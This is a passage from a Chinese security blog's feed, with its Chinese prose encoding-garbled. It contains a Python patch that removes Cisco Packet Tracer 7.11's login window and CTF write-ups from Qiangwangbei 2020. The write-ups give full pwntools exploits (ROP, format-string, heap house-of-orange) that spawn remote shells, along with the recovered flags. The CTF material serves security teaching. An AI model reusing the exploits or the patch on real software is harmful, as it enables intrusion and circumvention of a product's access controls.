alt></p><p>ç„¶åç›´æ¥è¿è¡Œä¸€ä¸‹ï¼Œç„¶åçš„ç¡®æ˜¯æˆåŠŸäº†ï¼Œå»æ‰äº†ç™»é™†æ¡†ã€‚</p><p>ç„¶åè¿›è¡Œä¿å­˜è¡¥ä¸ï¼Œæ›¿æ¢ä¸»ç¨‹åºå³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>çš„ç¡®æ˜¯æ‰¾åˆ°äº†å…³é”®å¤„ï¼Œæ„Ÿè§‰æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œç”±äºå‰äººç»éªŒå°±æ˜¯ä»ç™»é™†ç•Œé¢ä¸‹æ‰‹çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥è·Ÿéšè¿™ä¸ªæ€è·¯æ“ä½œã€‚åœ¨å®Œå·¥ä»¥åï¼Œå°è¯•å»æä¸€ä¸‹15så“ªé‡Œçš„éªŒè¯ï¼Œæƒ³ç‚¹ä¸€ä¸‹ç›´æ¥å˜ä¸º0sï¼Œå¯ä»¥ç‚¹å‡»ç¡®è®¤ï¼Œå‘ç°æ˜¯çš„ç¡®éº»çƒ¦ä¹Ÿæ²¡æœ‰æˆåŠŸå°±æ”¾å¼ƒäº†ã€‚</p><h2 id="åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸"><a href="#åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸" class="headerlink" title="åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸"></a>åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸</h2><p>ä¸å¤ªä¼šå†™cï¼Œç”¨python å†™äº†æ‰“è¡¥ä¸çš„ç¨‹åºï¼Œç¡®ä¿æœ¬æœºæœ‰python2çš„è¿è¡Œç¯å¢ƒã€‚ç„¶åæŠŠè„šæœ¬æ”¾åœ¨å…¶å®‰è£…è·¯å¾„çš„binç›®å½•ä¸‹ï¼Œè¿è¡Œå³å¯ã€‚</p><p>ä¹Ÿå¯ä»¥æŠŠç¨‹åºæ‹–å‡ºæ¥ï¼Œæ‰“å®Œè¡¥ä¸åæ›¿æ¢åŸæ¥çš„ç¨‹åºå³å¯ã€‚</p><pre><code class="python">#!/usr/bin/env python2.7import structimport osdef WriteFile():    with open(&#39;PacketTracer7.exe&#39;,&#39;r&#39;) as f:         dt = f.read()    dt = dt[:0x17a5245]+&#39;\xe9\xee\x04\x00\x00\x90&#39;+dt[0x17a524b:]    with open(&#39;PacketTracer7.exe&#39;, &#39;w&#39;) as f:        f.write(dt)if __name__ == &#39;__main__&#39;:    WriteFile()</code></pre><p>é’ˆå¯¹çš„åªæ˜¯7.11ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£&quot;&gt;&lt;a href=&quot;#å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£&quot; class=&quot;headerlink&quot; title=&quot;å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£&quot;&gt;&lt;/a&gt;å®æˆ˜å»é™¤æ€ç§‘packet trac
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®</title>
    <link href="http://chumen77.xyz/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/24/å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®/</id>
    <published>2020-08-24T02:34:05.216Z</published>
    <updated>2020-09-23T12:02:35.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®"><a href="#å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®"></a>å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>   Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)</code></pre><p>åŸºæœ¬ä¿æŠ¤ä¸ç®—å¤šã€‚</p><p>æ˜¯ä¸€ä¸ªä¼ªå †é¢˜ã€‚</p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>åœ¨ <code>leave_message(v1)</code>å‡½æ•°è¿™é‡Œçš„v1ä¸Šæ¥å–å€¼å°±æ˜¯16</p><pre><code class="c">__int64 __fastcall leave_message(unsigned int a1){  int v1; // ST14_4  __int64 v3; // [rsp+18h] [rbp-8h]  puts(&quot;message: &quot;);  v1 = read(0, &amp;v3, a1);  strncpy(buf, (const char *)&amp;v3, v1);  buf[v1] = 0;  puts(&quot;done!\n&quot;);  return 0LL;}</code></pre><p>è¿›å…¥ä»¥åå¯ä»¥å‘ç°ï¼Œv3æ˜¯åªæœ‰8å­—èŠ‚å¤§å°çš„ï¼Œå¯ä»¥æº¢å‡º8å­—èŠ‚ï¼Œå¯ä»¥è¦†ç›–åˆ°rbpã€‚</p><h5 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h5><pre><code>.text:0000000000400985 ; 22:         if ( v1 &gt; 256 ).text:0000000000400985                 cmp     [rbp+var_4], 100h.text:000000000040098C                 jle     short loc_400995.text:000000000040098E ; 23:           v1 = 256;.text:000000000040098E                 mov     [rbp+var_4], 100h.text:0000000000400995 ; 24:         leave_message(v1);</code></pre><p>åœ¨è¿›å…¥<code>leave_message(v1)</code>å‰v1æœ‰ä¸€ä¸ªå¯¹äº0x100å¤§å°çš„åˆ¤æ–­ï¼Œè¦æ˜¯v1å¤§äº0x100å°±ç»™è®¾ç½®ä¸º0x100ã€‚è¿™å°±å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè¿›è¡Œropã€‚</p><p>æ€ä¹ˆæ§åˆ¶v1ï¼š</p><pre><code>signed int v1; // [rsp+Ch] [rbp-4h]</code></pre><p>å¯ä»¥æ˜æ˜¾çœ‹åˆ°v1åœ¨rbp-4çš„åœ°å€ï¼Œç„¶årbpï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºè¦†ç›–ï¼Œè¦†ç›–åˆ°åˆé€‚çš„åœ°æ–¹åï¼Œä¿éšœ-4åï¼Œæœ‰ä¸ªintå¤§å°çš„å¤§äºç­‰äº0x100çš„å€¼å³å¯ã€‚</p><p>è¿™ä¸ªåˆé€‚åœ°å€ï¼Œå¯ä»¥ä»<code>leave_name()</code> ä¸‹æ‰‹ï¼Œå› ä¸ºå…¶å¾€bssæ®µè¯»äº†å€¼ã€‚</p><pre><code>byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><ul><li>æ„é€ ropé“¾ï¼Œæ³„æ¼å‡ºlibcçš„åœ°å€ï¼Œè¿”å›startï¼Œè®©ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œæ¸…ç†æ ˆ</li><li>å†æ¬¡åˆ©ç”¨ï¼Œæ§åˆ¶ret address ä¸º<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./babymessage&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,21342)    libc = elf.libc    libc = ELF(&#39;./libc-2.27.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400ac3start = 0x04006E0sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)sla(&#39;choice&#39;,&#39;2&#39;)rop = flat([pop_rdi,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],start])payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)ru(&#39;done!&#39;)r(2)libc_base = uu64(r(6)) - libc.sym[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)# debug()payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)rec = 0x10a45c + libc_basesla(&#39;choice&#39;,&#39;2&#39;)rop = p64(rec)payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)itr()</code></pre><pre><code class="python">flag{f4c1c2c2407055f2665dec486e7d1b16}</code></pre><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ— é™æ¬¡è§¦å‘ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><pre><code class="c">signed __int64 __fastcall sub_1212(const char *a1){  char *v2; // [rsp+18h] [rbp-128h]  char s; // [rsp+20h] [rbp-120h]  unsigned __int64 v4; // [rsp+138h] [rbp-8h]  v4 = __readfsqword(0x28u);  v2 = strstr(a1, &quot;Remind me to &quot;);  if ( !v2 )    return 0LL;  memset(&amp;s, 0, 0x110uLL);  sprintf(&amp;s, &quot;&gt;&gt;&gt; OK, I&#39;ll remind you to %s&quot;, v2 + 13);  printf(&amp;s);  puts(&amp;::s);  return 1LL;}</code></pre><p>å‘ç°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ æ‰€è¾“å…¥çš„éƒ½ä¼šè¢«sprintfå¤„ç†ä»¥åç»™printfå‡½æ•°ã€‚ç”±äºå…¶æ˜¯<code>%s</code>æ¥å¤„ç†æ•°æ®ï¼Œè¿™å°±è®©ç›´æ¥åœ¨æ ˆä¸Šå†™åœ°å€ï¼Œç„¶åæ”»å‡»é€ æˆäº†éš¾åº¦ã€‚<br>ä½†æ˜¯è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå…¶å®è¾“å…¥çš„ä¸œè¥¿è¿˜ä¼šä¿ç•™åœ¨æ ˆä¸Šï¼Œå› ä¸ºsprintfå¤„ç†æ•°æ®ä¹Ÿæ˜¯ä»æ ˆä¸Šæ‹¿çš„ï¼Œæ‰€ä»¥ä¼šè¢«ä¿ç•™çš„ã€‚</p><h4 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><ul><li>ç¬¬ä¸€æ¬¡è§¦å‘ï¼Œæ³„æ¼å‡ºlibcåœ°å€ï¼Œstackåœ°å€ã€‚</li><li>æ‰§è¡Œåˆ°printfå‡†å¤‡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œç”¨sprintfæ®‹ç•™æ ˆä¸Šçš„æ•°æ®ï¼ˆåœ¨0x100åï¼‰ï¼Œè¿™ä¸ªéœ€è¦ç²¾å¿ƒæ„é€ å¥½åï¼Œè¿›è¡Œæ”»å‡»ret addressã€‚éœ€è¦ä¸€æ¬¡æ€§æ”¹å¥½ã€‚</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,12124)    # libc = elf.libc    libc = ELF(&#39;./libc.so.6&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def start_attc():    sla(&#39;&gt;&gt;&#39;,&#39;Hey Siri!&#39;)    r()a = &#39;Remind me to &#39;start_attc()payload = str(a) + &#39;%83$p&#39; + &#39;bbb&#39; + &#39;%7$p&#39;# ru(&#39;&gt;&gt;&gt;&#39;)s(payload)ru(&#39;0x&#39;)libc_base = int(r(12),16) - 0x21b97info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;bbb0x&#39;)stack_base = int(r(12),16) - 0x150info_addr(&#39;stack_base&#39;,stack_base)tag = stack_base + 0x148start_attc()def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 27fmtpayload = &quot;&quot;key = 0x4f365 + libc_baseinfo_addr(&#39;key&#39;,key)for i in range(3):    fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffprint(fmtpayload)payload = str(a) + fmtpayloadpayload +=&#39;aaa&#39; + &#39;b&#39; + p64(tag)[0:6] + &#39;\x00&#39;*2 + p64(tag+2)[0:6] + &#39;\x00&#39;*2  + p64(tag+4)[0:6] + &#39;\x00&#39;*2 + p64(tag+6)[0:6] + &#39;\x00&#39;*2s(payload)itr()</code></pre><pre><code class="python">flag{da8836b9e9df3db44fe4bd7f39d4f7ab}</code></pre><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Idaåç¼–è¯‘åçš„ä»£ç æ¯”è¾ƒéš¾çœ‹ï¼Œå‘ç°é‡ç‚¹æ•°æ®é€ æˆäº†å›°éš¾ï¼Œå°±é‡‡å–åŠ¨æ€è°ƒè¯•ã€‚</p><p>åŸºæœ¬æµç¨‹å°±æ˜¯ï¼Œgetsä¸€æ®µä½ è¾“å…¥çš„flagï¼Œè¯»å…¥åç”¨<code>sub_12f0_</code>è¿›è¡Œå¤„ç†ï¼Œç„¶åç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ªå­—ç¬¦æ¥è¿›è¡Œå¯¹æ¯”ã€‚</p><h3 id="sub-12F0-åŠ å¯†å‡½æ•°"><a href="#sub-12F0-åŠ å¯†å‡½æ•°" class="headerlink" title="sub_12F0_åŠ å¯†å‡½æ•°"></a><code>sub_12F0_</code>åŠ å¯†å‡½æ•°</h3><pre><code class="python">_BYTE *__fastcall sub_12F0(_BYTE *a1){  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm { endbr64 }  result = (_BYTE *)sub_1090();  if ( (signed int)result &lt;= 0 )    return result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - 1);  v4 = 0LL;  do  {    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65;    v5 = v4++;  }  while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }  while ( v2 &gt; v6 );  return result;}</code></pre><p>åŠ¨æ€è°ƒè¯•ï¼Œè¿›è¡Œèµ·æ¥å¾ˆå®¹æ˜“çœ‹æ‡‚ã€‚ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªå¯¹è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªä¸<code>byte_4010</code>çš„å­—ç¬¦<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7ç»„æ¥è¿›è¡Œä¸€ä¸ªå¼‚æˆ–å’Œ+65ã€‚</p><p>ç„¶åä¸‹é¢ï¼š</p><pre><code class="python"> while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }</code></pre><p>åªçœ‹ç€è®©äººå¤´å¤§ï¼Œè¾“å…¥<code>flag{11111111111111111111111111111111111111111}</code> åŠ¨æ€è°ƒè¯•ä¸€ä¸‹å‘ç°ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>åˆ†æè¿™2ç»„æ•°æ®å°±ä¼šå‘ç°ï¼Œæ¯æ¬¡å¯¹4ä¸ªæ•°æ®ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†ã€‚å¤„ç†åç»“æœå°±æ˜¯åŸæ¥çš„ï¼š <code>v1 &gt; v2 &gt; v3 &gt; v4</code> å˜ä¸º <code>v4 &gt; v1 &gt; v2 &gt; v3</code> è¿™æ ·çš„ç»“æœã€‚</p><p>ç„¶åå¤„ç†å®Œå°±ç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚è¿™è‚¯å®šä¸ºä¸€ä¸²å¤„ç†è¿‡çš„å­—ç¬¦ä¸²ï¼Œidaä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥æå–æœ‰ç‚¹å®³æ€•æå–é”™ï¼ŒåŠ¨è°ƒæ—¶æå–ä¸€ä¸‹å‡ºæ¥ï¼š</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]</code></pre><p>ä¹Ÿå°±æ˜¯è¿™ä¸€æ®µæ•°æ®ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>è‡ªå·±ç›´æ¥æ‰‹åŠ¨æ›¿æ¢çš„æ•°æ®ã€‚</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]tag2 = [0x78, 0x7C, 0x64,0x4C,0x55, 0x77, 0x65,0x54, 0x49,0x76, 0x4E,0x5C, 0x43, 0x42, 0x4F,0x68,0x71, 0x44, 0x4E,0x4C,0x57, 0x7D, 0x49,0x66, 0x46, 0x5A, 0x43,0x6D, 0x69,0x79, 0x78, 0x74, 0x5C, 0x50, 0x57, 0x4F,0x65, 0x62, 0x44,0x5E]qwkey = [&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;]flag = &#39;&#39;i = 0j = 0for i in range(len(tag2)):    if j ==7:        j = 0    flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7]))    j += 1print(str(flag))</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>ä¼°è®¡æ²¡æœ‰æå–å…¨ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“flagäº†ã€‚</p><pre><code class="python">flag{QWB_water_problem_give_you_the_score}</code></pre><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æé†’äº†æ˜¯house of orangeï¼Œé‚£å°±æƒ³ç€è¿™æ ·åˆ©ç”¨å³å¯ã€‚ç°åœ¨house of orangeçš„æ€æƒ³ï¼Œç»ŸæŒ‡ä¸»è¦æ˜¯é’ˆå¯¹æ²¡æœ‰freeçš„å †é¢˜ï¼Œå…¶æ”¹top chunkï¼Œç„¶åç”³è¯·ä¸€ä¸ªå¤§ç‚¹çš„chunkï¼Œæ¥è¿›è¡Œè·å–ä¸€ä¸ªè¿›å…¥unsortbin çš„å †å—ã€‚æ²¡æœ‰å¦‚æœ€æ—©çš„å¾ˆç»å…¸çš„åˆ©ç”¨unsortbin attack å’Œ io ç»“åˆæ¥è·å–shellã€‚</p><p>é¢˜ç›®çš„case2 <code>Invite her to go to a movie.</code> ä¸­ï¼š</p><pre><code class="c">  printf(&quot;movie name &gt;&gt; &quot;, &amp;buf);            v4 = atoi((const char *)&amp;buf);            read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL);</code></pre><p>ç”±äºå…¶æ˜¯åœ¨åŠ 0x60ä¹‹åè¯»å–ï¼Œä¸”åœ¨case 1 åªæ˜¯malloc(0x68)ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„å¯ä»¥æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæ”¹å†™åˆ° top chunkã€‚</p><p>å¹¶ä¸”case3ï¼š</p><pre><code class="c">  puts(&quot;You are the apple of my eyes too!&quot;);          qword_404098 = (__int64)malloc(0x1000uLL);          ++v12;</code></pre><p>å¯ä»¥ç»™ä½ ç”³è¯·0x1000çš„å †å—ï¼Œè¿™å°±å¯ä»¥å®ç°äº†house of orangeã€‚</p><p>åœ¨case5ä¸­ï¼š</p><pre><code class="c">  puts(&quot;\nHotaru: Won&#39;t you stay with me for a while? QAQ\n&quot;);        read(0, &amp;key, 8uLL);    </code></pre><p>ä¼šç»™<code>0x4040A0</code> è¯»ä¸€æ®µæ•°æ®ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>æ˜¯ç´§æŒ¨ç€å †å—çš„ã€‚ç„¶è€Œåœ¨case2ä¸­åœ¨editæ—¶ä¹Ÿæ²¡æœ‰å¯¹å †å—åºå·çš„æ£€æŸ¥,è®©ä¸ªäººè¾“å…¥ä¸ª8 å³å¯å–åˆ°è¿™é‡Œï¼Œè¿›è¡Œç¼–è¾‘ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>house of orangeæ¥è·å–ä¸€ä¸ªunsortbin </li><li>ç”³è¯·ä¸€ä¸ªå †å—ï¼Œä¼šåœ¨è¿™ä¸ªold top chunkä¸­ï¼Œåˆ‡å‡ºä¸€ä¸ªå †å—ï¼Œå…¶ä¸Šä¼šå­˜åœ¨libcçš„ç›¸å…³åœ°å€</li><li>showä¸€ä¸‹ï¼Œæ³„æ¼å‡ºlibc base</li><li>leave <code>__malloc_hook - 0x60</code>çš„åœ°å€åœ¨<code>key</code> å¤„ï¼Œç„¶åè¿›è¡Œç¼–è¾‘è¿™é‡Œçš„æ•°æ®ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./Just_a_Galgame&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def edit(idx,data):    sla(&quot;&gt;&gt;&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)def add():    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)def add100():    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)def leave(buf):    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)    s(str(buf))add()payload = &#39;\x00&#39;*8 + p64(0xd41)edit(0,payload)add100()add()show()ru(&#39;1: &#39;)libc_base = uu64(r(6)) - 0x3ec2a0info_addr(&#39;libc&#39;,libc_base)leave(p64(libc_base + 0x3ebc30 - 0x60))one_rec = 0x4f3c2 + libc_baseedit(8,p64(one_rec))add()itr()</code></pre><p>è¿˜æ˜¯æŒºç®€å•çš„ï¼Œæ¯”èµ›æ—¶ç«Ÿç„¶æ²¡æœ‰çœ‹è¿™ä¸ªé¢˜ã€‚</p><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">if ( !mallopt(1, 0) )    exit(-1);</code></pre><ul><li><p>ç¦ç”¨äº†fastbinï¼ŒåŸç†å°±æ˜¯ä¿®æ”¹<code>global_max_fast</code> = 0x10</p></li><li><p>å­˜åœ¨off by null</p></li><li><p>æ²¡æœ‰showåŠŸèƒ½</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3></li><li><p>åˆ©ç”¨off by null ï¼Œä¿®æ”¹unsorted bin çš„bkä¸º<code>global_max_fast - 0x10</code></p></li><li><p>åˆ©ç”¨unsorted bin æ”»å‡» <code>global_max_fast</code></p></li><li><p>æ¥ç€fastbin attack æ‰“io fileçš„stdoutï¼Œæ³„æ¼libc</p></li><li><p>æ¥ç€fastbin attackæ‰“ <code>malloc_hook</code> ä¸ºone gadget</p></li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import 